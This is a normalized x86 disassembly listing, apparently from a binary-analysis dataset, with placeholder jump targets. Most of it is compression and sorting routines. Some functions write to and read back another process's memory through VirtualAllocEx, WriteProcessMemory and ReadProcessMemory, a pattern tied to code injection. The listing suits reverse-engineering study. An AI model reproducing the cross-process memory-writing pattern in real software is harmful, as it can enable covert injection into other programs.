movzx ecx [ ecx + edx - 0x1 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
xor eax eax
mov [ edi ] ax
mov eax [ ebp + 0x70 ]
movzx eax [ eax + edx - 0x2 ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi - 0x2 ] cx
mov ecx [ ebp + 0x70 ]
movzx ecx [ ecx + edx - 0x3 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
sub edx 0x4
sub edi 0x8
cmp edx 0x3
jge r-xdata
mov cl [ edi + eax ]
mov edx [ ebp + 0x68 ]
mov [ edx + eax ] cl
mov edx [ ebp + 0x78 ]
add [ ebp + 0x78 ] 0x2
xor ecx ecx
inc eax
cmp eax 0x22
mov [ edx ] cx
jl r-xdata
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
jmp r-xdata
xor ecx ecx
inc ecx
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
mov ecx [ ebp + 0x194 ]
mov edx [ ebp + 0x64 ]
lea edx [ edx + ecx * 2 ]
xor eax eax
add ecx edi
mov [ ebp + 0x78 ] edx
mov [ ebp + 0x68 ] ecx
mov edx [ esi + ecx * 4 - 0x4 ]
lea eax [ esi + ecx * 4 ]
add [ eax ] edx
inc ecx
cmp ecx 0x10000
jle r-xdata
movzx ax [ edi ]
mov edx [ ebp + 0x194 ]
shl ax 0x8
dec edx
cmp edx 0x3
movzx ecx ax
jl r-xdata
test edx edx
jl r-xdata
mov edi [ ebp + 0x70 ]
or [ ebp + 0x78 ] 0xffffffff
sub [ ebp + 0x78 ] edi
mov [ ebp + 0x80 ] 0xfffffffe
sub [ ebp + 0x80 ] edi
lea eax [ edi + edx - 0x1 ]
push 0x100
xor edi edi
lea eax [ ebp + 0x84 ]
push edi
push eax
call sub_10024b80
add esp 0xc
mov eax [ ebp + 0x70 ]
movzx ax [ eax + edx ]
shl ax 0x8
shr cx 0x8
or ax cx
movzx ecx ax
movzx eax cx
lea edi [ esi + eax * 4 ]
mov eax [ edi ]
dec eax
mov [ edi ] eax
mov [ ebx + eax * 4 ] edx
dec edx
jns r-xdata
movzx di [ eax + 0x1 ]
shr cx 0x8
shl di 0x8
or di cx
movzx edi di
movzx ecx di
lea ebx [ esi + ecx * 4 ]
mov ecx [ ebx ]
dec ecx
mov [ ebx ] ecx
mov ebx [ ebp + 0x6c ]
mov [ ebx + ecx * 4 ] edx
movzx cx [ eax ]
shl cx 0x8
shr di 0x8
or cx di
movzx ecx cx
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
lea edi [ edx - 0x1 ]
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x1 ]
mov ecx [ ebp + 0x74 ]
shl di 0x8
shr cx 0x8
or di cx
movzx ecx di
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x78 ]
add edi eax
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x2 ]
mov ecx [ ebp + 0x74 ]
shr cx 0x8
shl di 0x8
or di cx
movzx ecx di
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x80 ]
add edi eax
sub edx 0x4
sub eax 0x4
cmp edx 0x3
mov [ ebx + ecx * 4 ] edi
mov ecx [ ebp + 0x74 ]
jge r-xdata
mov [ ebp + edi * 4 - 0x3a4 ] edi
inc edi
cmp edi 0xff
jle r-xdata
xor eax eax
inc eax
imul eax eax 0x3
inc eax
cmp eax 0x100
jle r-xdata
mov [ ebp + 0x7c ] eax
cmp [ ebp + 0x7c ] 0x1
jne r-xdata
lea eax [ ebp - 0x3a4 ]
mov [ ebp + 0x78 ] eax
mov eax [ ebp + 0x7c ]
push 0x3
cdq
pop ecx
idiv ecx
cmp eax 0xff
mov [ ebp + 0x7c ] eax
mov [ ebp + 0x74 ] eax
jg r-xdata
and [ ebp + 0x78 ] 0x0
and [ ebp + 0x74 ] 0x0
inc [ ebp + 0x74 ]
mov eax [ ebp + 0x6c ]
add [ ebp + 0x78 ] 0x4
cmp [ ebp + 0x74 ] 0xff
mov [ ebp + edi * 4 - 0x3a4 ] eax
jle r-xdata
mov eax [ ebp + 0x78 ]
jmp r-xdata
inc [ ebp + 0x7c ]
cmp [ ebp + 0x7c ] 0xff
jle r-xdata
shl eax 0x8
add eax [ ebp + 0x7c ]
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x6c ] eax
mov eax [ eax ]
test eax 0x200000
jne r-xdata
mov edi [ ebp + 0x74 ]
mov eax [ ebp + edi * 4 - 0x3a4 ]
mov ecx [ ebp + 0x78 ]
mov ecx [ ecx ]
mov [ ebp + 0x6c ] eax
shl eax 0xa
shl ecx 0xa
add eax esi
lea edx [ ecx + esi ]
mov ecx [ eax + 0x400 ]
sub ecx [ eax ]
mov eax [ edx + 0x400 ]
sub eax [ edx ]
cmp eax ecx
jbe r-xdata
mov edx [ eax ]
mov [ ebp + edi * 4 - 0x3a4 ] edx
mov edx [ ebp + 0x7c ]
sub edi edx
shl edx 0x2
sub eax edx
mov edx [ ebp + 0x7c ]
dec edx
cmp edi edx
mov [ ebp + 0x68 ] eax
jle r-xdata
cmp [ ebp + 0x7c ] eax
je r-xdata
lea ecx [ ebp + eax + 0x84 ]
cmp [ ecx ] 0x0
mov [ ebp + 0x60 ] ecx
jne r-xdata
mov eax [ ebp + 0x6c ]
mov ecx 0xffdfffff
and eax ecx
mov [ ebp + 0x80 ] eax
mov eax [ ebp + 0x6c ]
mov edi [ eax + 0x4 ]
and edi ecx
dec edi
cmp edi [ ebp + 0x80 ]
jle r-xdata
mov eax [ eax ]
shl eax 0xa
add eax esi
mov edx [ eax + 0x400 ]
sub edx [ eax ]
cmp edx ecx
ja r-xdata
push 0x3ee
mov edx eax
shl edx 0x2
lea ecx [ esi + edx ]
mov [ ebp + 0x7c ] ecx
mov [ ebp + 0x80 ] ecx
xor ecx ecx
or [ eax ] 0x200000
mov eax [ ebp + 0x68 ]
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
mov eax [ ebp + 0x68 ]
mov edi [ ebp + 0x80 ]
mov edi [ edi ]
and edi 0xffdfffff
mov [ ebp + ecx - 0x7a4 ] edi
mov edi [ ebp + 0x80 ]
mov edi [ edi + 0x4 ]
add [ ebp + 0x80 ] 0x400
and edi 0xffdfffff
dec edi
mov [ ebp + ecx - 0xba4 ] edi
add ecx 0x4
cmp ecx 0x3fc
jle r-xdata
shl eax 0xa
lea edi [ eax + esi ]
mov eax [ edi ]
lea ecx [ ebp + edx - 0x7a4 ]
and eax 0xffdfffff
cmp eax [ ecx ]
mov [ ebp + 0x80 ] edi
mov [ ebp + 0x68 ] ecx
jge r-xdata
push [ ebp + 0x5c ]
mov eax [ ebp + 0x80 ]
push edi
push [ ebp + 0x194 ]
push [ ebp + 0x64 ]
push [ ebp + 0x70 ]
push ebx
call sub_1002194c
sub edi [ ebp + 0x80 ]
mov eax [ ebp + 0x78 ]
lea eax [ eax + edi + 0x1 ]
mov [ ebp + 0x78 ] eax
mov eax [ ebp + 0x5c ]
add esp 0x18
cmp [ eax ] 0x0
jl r-xdata
mov eax edi
sub eax [ ebp + 0x80 ]
inc eax
push eax
push [ ebp + 0x78 ]
push [ ebp + 0x7c ]
push [ ebp + 0x68 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x18
mov eax [ edi + 0x400 ]
lea edx [ ebp + edx - 0xba4 ]
and eax 0xffdfffff
mov [ ebp + 0x80 ] edx
jmp r-xdata
mov ecx [ ebx + eax * 4 ]
dec ecx
jns r-xdata
mov ecx [ ebp + 0x184 ]
pop edi
xor ecx ebp
pop ebx
call sub_100242d7
add ebp 0x188
leave
retn
dec eax
cmp eax [ edx ]
jg r-xdata
mov edi [ ebp + 0x70 ]
movzx edi [ edi + ecx ]
cmp [ ebp + edi + 0x84 ] 0x0
jne r-xdata
add ecx [ ebp + 0x194 ]
mov ecx [ ebx + eax * 4 ]
dec ecx
jns r-xdata
mov eax [ ebp + 0x68 ]
mov eax [ eax ]
mov edx [ edx ]
lea ecx [ eax - 0x1 ]
cmp ecx edx
je r-xdata
mov ecx [ ebp + 0x68 ]
inc eax
cmp eax [ ecx ]
jl r-xdata
lea edi [ ebp + edi * 4 - 0x7a4 ]
mov [ ebp + 0x6c ] edi
mov edi [ edi ]
mov [ ebx + edi * 4 ] ecx
mov ecx [ ebp + 0x6c ]
inc edi
mov [ ecx ] edi
mov edx [ ebp + 0x70 ]
movzx edx [ edx + ecx ]
cmp [ ebp + edx + 0x84 ] 0x0
jne r-xdata
add ecx [ ebp + 0x194 ]
mov eax [ ebp + 0x7c ]
mov ecx 0x100
test eax eax
jne r-xdata
mov edi [ ebp + 0x80 ]
mov edx [ ebp + 0x80 ]
lea edx [ ebp + edx * 4 - 0xba4 ]
mov [ ebp + 0x6c ] edx
mov edx [ edx ]
mov [ ebx + edx * 4 ] ecx
mov ecx [ ebp + 0x6c ]
dec edx
mov [ ecx ] edx
or [ eax ] 0x200000
add eax 0x400
dec ecx
jne r-xdata
cmp [ ebp + 0x74 ] 0xff
mov eax [ ebp + 0x60 ]
mov [ eax ] 0x1
jge r-xdata
push 0x3ef
jmp r-xdata
mov eax [ ebp + 0x194 ]
dec eax
cmp edx eax
jne r-xdata
inc [ ebp + 0x74 ]
cmp [ ebp + 0x74 ] 0xff
jle r-xdata
mov edx [ edi ]
mov eax [ edi + 0x400 ]
and [ ebp + 0x80 ] 0x0
mov ecx 0xffdfffff
and edx ecx
and eax ecx
sub eax edx
cmp eax 0xfffe
jle r-xdata
call sub_1001bf0e
mov eax [ ebp + 0x74 ]
mov eax [ ebp + eax * 4 - 0x3a4 ]
and [ ebp + 0x7c ] 0x0
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
dec eax
mov [ ebp + 0x60 ] eax
mov [ ebp + 0x7c ] eax
js r-xdata
inc [ ebp + 0x80 ]
mov ecx [ ebp + 0x80 ]
mov edi eax
sar edi cl
cmp edi 0xfffe
jg r-xdata
mov eax [ ebp + 0x194 ]
sub eax [ ebp + 0x78 ]
push eax
push [ ebp + 0x78 ]
push [ ebp + 0x194 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x14
mov ecx [ ebp + 0x80 ]
sar eax cl
cmp eax 0xffff
jg r-xdata
add edx eax
lea edi [ ebx + edx * 4 ]
push 0x3ea
jmp r-xdata
dec [ ebp + 0x7c ]
sub edi 0x4
cmp [ ebp + 0x7c ] 0x0
jge r-xdata
mov eax [ ebp + 0x194 ]
add edx eax
mov eax [ ebp + 0x64 ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp + 0x80 ]
mov eax [ ebp + 0x7c ]
mov edx [ edi ]
sar eax cl
cmp edx 0x22
movzx ecx ax
mov eax [ ebp + 0x64 ]
mov [ eax + edx * 2 ] cx
jge r-xdata
mov eax [ ebp + 0x60 ]
sub_10022388
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ edi + 0x20 ]
mov edx [ edi + 0x18 ]
mov ecx [ edi + 0x24 ]
push ebx
mov ebx [ edi + 0x268 ]
push esi
mov esi [ edi + 0x44 ]
cmp esi 0x2710
mov [ ebp - 0x18 ] eax
mov eax [ edi + 0x30 ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
jge r-xdata
lea edx [ esi + 0x22 ]
test dl 0x1
je r-xdata
push ebx
push esi
mov eax edx
jmp r-xdata
add edx ecx
cmp eax 0x1
mov [ ebp - 0xc ] edx
jge r-xdata
inc edx
push [ edi + 0x14 ]
push [ edi + 0x10 ]
call sub_100211f9
add esp 0x10
cmp eax 0x64
jle r-xdata
xor eax eax
inc eax
cmp [ edi + 0x1c ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
dec eax
push 0x3
pop ebx
cdq
idiv ebx
mov edx ecx
mov ecx [ ebp - 0x18 ]
mov ebx eax
imul ebx esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
push esi
push [ ebp - 0xc ]
mov esi [ ebp - 0x14 ]
call sub_10021cbc
add esp 0x10
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
push 0x64
pop eax
pop esi
pop ebx
leave
retn
push 0x3eb
call sub_1001bf0e
mov [ edi + 0x1c ] eax
inc eax
cmp eax [ edi + 0x44 ]
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] 0x1
test eax eax
je r-xdata
jmp r-xdata
or [ edi + 0x1c ] 0xffffffff
xor eax eax
cmp [ edi + 0x44 ] eax
jle r-xdata
cmp [ ebp - 0x4 ] 0x2
jl r-xdata
sub ebx [ ebp - 0x8 ]
push ecx
mov [ ebp - 0x1c ] ebx
fild [ ebp - 0x1c ]
push ecx
fidiv [ ebp - 0xc ]
fstp [ esp ]
push eax
push ebx
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x18
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x10 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
sub_100224b4
push ebp
mov ebp esp
mov eax 0x1440
call sub_10036d50
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jle r-xdata
xor eax eax
xor edx edx
inc eax
cmp edi eax
mov ebx edi
mov [ ebp - 0x420 ] edx
mov [ ebp - 0xc30 ] edx
mov [ ebp - 0x1440 ] 0xfffffffe
mov [ ebp - 0x4 ] eax
jl r-xdata
lea edx [ ebp - 0xc2c ]
sub edx ecx
mov esi edi
cmp ebx 0x204
jge r-xdata
mov ecx edi
or eax 0xffffffff
lea edi [ ebp - 0x143c ]
[ edi ]
shl eax 0x8
mov [ edx + ecx ] eax
add ecx 0x4
dec esi
jne r-xdata
inc eax
push 0x7d2
jmp r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
inc edx
xor bl bl
cmp edi edx
jl r-xdata
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
mov esi [ ecx ]
mov ecx edx
mov eax [ ecx ]
test eax eax
jne r-xdata
call sub_1001bf0e
pop edi
pop esi
pop ebx
leave
retn
lea esi [ ebp - 0x143c ]
mov ecx [ ebp - 0x4 ]
inc edx
lea eax [ ebp + edx * 4 - 0x420 ]
mov [ eax ] ecx
mov eax ecx
mov ecx edx
sar ecx 0x1
mov edi [ ebp + ecx * 4 - 0x420 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov esi [ ecx ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
mov [ ebp - 0xc ] edx
jge r-xdata
cmp edx 0x104
jl r-xdata
mov [ ebp + ecx * 4 - 0x420 ] edi
mov ecx [ ebp - 0x8 ]
mov edi ecx
sar edi 0x1
mov [ ebp - 0x8 ] edi
mov edi [ ebp + edi * 4 - 0x420 ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
jl r-xdata
jmp r-xdata
cmp ecx 0x11
mov eax [ ebp + 0x8 ]
mov [ eax + edx - 0x1 ] cl
jle r-xdata
mov eax esi
cmp edx 0x1
jg r-xdata
push 0x7d1
inc [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
inc edx
add esi 0x4
cmp edx edi
jle r-xdata
mov bl 0x1
mov eax [ eax ]
lea eax [ ebp + eax * 4 - 0x1440 ]
inc ecx
cmp [ eax ] 0x0
jge r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ ebp + edx * 4 - 0x420 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push 0x2
dec edx
pop esi
inc eax
cmp esi edx
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
xor ecx ecx
cmp [ esi ] ecx
jl r-xdata
test bl bl
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] ecx
mov esi [ ebp + edx * 4 - 0x420 ]
mov ecx [ ebp - 0x41c ]
xor eax eax
dec edx
inc eax
cmp edx 0x2
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
jl r-xdata
mov ecx [ ebp + ecx * 4 - 0xc30 ]
mov [ ebp - 0xc ] ecx
xor esi esi
inc esi
mov esi [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] esi
mov esi [ ebp - 0x10 ]
mov eax ecx
shl eax 0x2
mov ecx [ ebp + eax - 0xc30 ]
shl esi 0x2
inc ebx
mov [ ebp + eax - 0x1440 ] ebx
mov eax [ ebp + esi - 0xc30 ]
mov edi 0xff
mov [ ebp + esi - 0x1440 ] ebx
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x4 ] edi
mov esi eax
and esi edi
mov edi [ ebp - 0x4 ]
cmp esi edi
jle r-xdata
mov esi [ ebp + esi * 4 - 0xc30 ]
cmp [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] esi
mov ecx [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + ecx * 4 - 0xc30 ]
jl r-xdata
mov ecx [ ebp + esi * 4 - 0x41c ]
mov edi [ ebp + esi * 4 - 0x420 ]
mov ecx [ ebp + ecx * 4 - 0xc30 ]
cmp ecx [ ebp + edi * 4 - 0xc30 ]
jge r-xdata
lea ecx [ ebp + esi * 4 - 0xc30 ]
mov eax [ ecx ]
sar eax 0x8
cdq
sub eax edx
sar eax 0x1
inc eax
shl eax 0x8
inc esi
cmp esi edi
mov [ ecx ] eax
jle r-xdata
jmp r-xdata
or [ ebp + ebx * 4 - 0x1440 ] 0xffffffff
mov esi 0xffffff00
and eax esi
and ecx esi
add eax ecx
inc edi
or eax edi
inc edx
mov [ ebp + ebx * 4 - 0xc30 ] eax
lea eax [ ebp + edx * 4 - 0x420 ]
mov ecx edx
sar ecx 0x1
mov [ eax ] ebx
mov esi [ ebp + ecx * 4 - 0x420 ]
mov eax ebx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov edi [ ecx ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
mov [ ebp - 0x4 ] edx
jge r-xdata
mov edi esi
mov esi [ ebp - 0x4 ]
mov esi [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x2
mov edi [ ebp + esi - 0x41c ]
mov esi [ ebp + esi - 0x420 ]
mov edi [ ebp + edi * 4 - 0xc30 ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jge r-xdata
mov [ ebp + eax * 4 - 0x420 ] ecx
mov eax esi
add esi esi
cmp esi edx
jle r-xdata
inc esi
mov ecx [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov ecx [ ecx ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp + eax * 4 - 0x420 ] esi
mov eax [ ebp - 0x4 ]
shl [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x4 ] edx
jle r-xdata
inc [ ebp - 0x4 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
sar edi 0x1
mov [ ebp + ecx * 4 - 0x420 ] esi
mov esi [ ebp + edi * 4 - 0x420 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
jge r-xdata
sub_100227f7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
xor ecx ecx
cmp esi [ ebp + 0x14 ]
push edi
mov ebx eax
mov [ ebp - 0x4 ] esi
jg r-xdata
push 0x17
xor eax eax
pop ecx
mov edi edx
[ edi ]
xor ecx ecx
cmp [ ebp + 0x18 ] ecx
jle r-xdata
xor eax eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
xor ecx ecx
inc ecx
movzx eax [ ecx + ebx ]
lea eax [ edx + eax * 4 + 0x4 ]
inc [ eax ]
inc ecx
cmp ecx [ ebp + 0x18 ]
jl r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] eax
jle r-xdata
movzx edi [ eax + ebx ]
cmp edi [ ebp - 0x4 ]
jne r-xdata
mov edi [ edx + ecx * 4 - 0x4 ]
lea eax [ edx + ecx * 4 ]
add [ eax ] edi
inc ecx
cmp ecx 0x17
jl r-xdata
mov edi [ ebp + 0x8 ]
push 0x17
xor eax eax
and [ ebp + 0x18 ] eax
pop ecx
[ edi ]
mov ecx [ ebp + 0x14 ]
cmp esi ecx
jg r-xdata
inc eax
cmp eax [ ebp + 0x18 ]
jl r-xdata
mov edi [ ebp + 0xc ]
mov [ edi + ecx * 4 ] eax
inc ecx
lea eax [ esi + 0x1 ]
cmp eax [ ebp + 0x14 ]
jg r-xdata
mov edi [ ebp + 0x8 ]
sub edi edx
sub ecx esi
lea eax [ edx + esi * 4 ]
mov [ ebp - 0x4 ] edi
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax * 4 - 0x4 ]
mov ebx [ ebp - 0x4 ]
lea esi [ eax + 0x4 ]
mov edi [ esi ]
sub edi [ eax ]
add [ ebp + 0x18 ] edi
mov edi [ ebp + 0x18 ]
shl [ ebp + 0x18 ] 0x1
dec edi
dec ecx
mov [ ebx + eax ] edi
mov eax esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov esi [ ecx ]
lea esi [ esi + esi + 0x2 ]
sub esi [ edx + eax * 4 ]
add ecx 0x4
mov [ edx + eax * 4 ] esi
inc eax
cmp eax [ ebp + 0x14 ]
jle r-xdata
sub_100228f5
push 0x7c
mov eax sub_1004e576
call sub_10028203
mov esi ecx
test ebx ebx
jne r-xdata
mov eax [ esi + 0x14 ]
push 0x4
push 0x1000
lea edi [ eax + eax ]
push edi
push 0x0
push ebx
call [ VirtualAllocEx@IAT ]
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001c7f
and [ ebp - 0x4 ] ebx
and [ ebp - 0x10 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x88 ]
push eax
call sub_10027dd1
cmp [ ebp - 0x10 ] edi
je r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push esi
push eax
push ebx
call [ WriteProcessMemory@IAT ]
cmp eax 0x1
je r-xdata
lea esi [ ebp - 0x1c ]
call sub_100156dd
push r--data
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001c7f
lea eax [ ebp - 0x44 ]
push eax
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10015885
push 0x0
push 0x1
lea ecx [ ebp - 0x44 ]
mov esi eax
mov [ ebp - 0x4 ] 0x4
call sub_10002020
push ebx
call sub_10022ab6
push [ ebp - 0x14 ]
lea edi [ ebp - 0x28 ]
push esi
push ebx
call sub_10022e97
push 0xa
mov [ ebp - 0x4 ] 0x6
call [ Sleep@IAT ]
mov eax edi
push eax
call sub_10014e75
mov ecx edi
mov [ ebp - 0x28 ] r--data
call sub_1001675f
call sub_100282db
retn
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
sub_10022a40
push 0x30
mov eax sub_1004ede9
call sub_10028203
push sub_10001a27
mov [ ebp - 0x18 ] r--data
call sub_10015788
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x3c ]
lea eax [ ebp - 0x18 ]
call sub_1001598d
mov esi eax
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10016468
pop ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
mov ebx [ eax + 0x8 ]
mov ecx esi
call sub_100228f5
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_10001500
call sub_100282db
retn 0x4
call sub_10003d5c
sub_10022ab6
push 0x70
mov eax sub_1004d141
call sub_1002826c
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push 0x15
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
call sub_100079fe
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] 0x10
mov edi [ ebp - 0x2c ]
jae r-xdata
lea eax [ ebp - 0x34 ]
push eax
push 0x15
push edi
push esi
push [ ebp - 0x38 ]
mov [ ebp - 0x34 ] ebx
call [ ReadProcessMemory@IAT ]
mov ebx eax
call [ GetLastError@IAT ]
cmp ebx 0x1
je r-xdata
lea edi [ ebp - 0x2c ]
cmp [ ebp - 0x34 ] 0x15
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov eax esi
sub edi esi
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
inc ecx
inc eax
cmp ecx 0x15
jl r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_10002075
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_10027dd1
mov dl [ edi + eax ]
cmp dl [ eax ]
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
call sub_100282ef
retn 0x4
sub_10022b84
push 0x20
mov eax sub_1004e9ff
call sub_10028203
mov esi [ ebp + 0x8 ]
xor edi edi
push edi
call sub_10015b38
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push r--data
push r--data
mov [ ebp - 0x4 ] edi
push edi
mov [ esi ] r--data
call [ CreateWindowExW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10014ddd
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov [ esi + 0x14 ] ebx
mov eax esi
call sub_100282db
retn 0x4
sub_10022c38
push 0x86c
mov eax sub_1004eda9
call sub_1002826c
xor ebx ebx
mov esi ecx
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x81c ] edi
mov [ ebp - 0x818 ] ebx
call sub_100187c5
cmp eax 0x197
je r-xdata
lea eax [ ebp - 0x834 ]
push eax
call sub_10022b84
lea eax [ ebp - 0x834 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014f8e
mov esi [ esi + 0x4 ]
push ebx
push 0x7
push 0x2eee
push esi
push [ ebp - 0x820 ]
call [ InternetErrorDlg@IAT ]
cmp eax ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x850 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x834 ]
push eax
call sub_10014e75
mov ecx edi
call sub_10003efc
lea ecx [ edi + 0x1c ]
call sub_10003efc
mov esi 0x800
push esi
lea eax [ ebp - 0x814 ]
push ebx
push eax
mov [ ebp - 0x818 ] 0x1
call sub_10024b80
add esp 0xc
lea eax [ ebp - 0x814 ]
push eax
mov ecx edi
call sub_100014e3
push esi
lea eax [ ebp - 0x814 ]
push ebx
push eax
call sub_10024b80
add esp 0xc
lea eax [ ebp - 0x814 ]
push eax
lea ecx [ edi + 0x1c ]
call sub_100014e3
lea ecx [ ebp - 0x834 ]
mov [ ebp - 0x4 ] bl
call sub_10022c19
mov eax edi
call sub_100282ef
retn
push r--data
lea ecx [ ebp - 0x850 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebp - 0x850 ]
push eax
lea ecx [ ebp - 0x878 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x878 ]
push eax
call sub_10027dd1
sub_10022d71
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e523
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
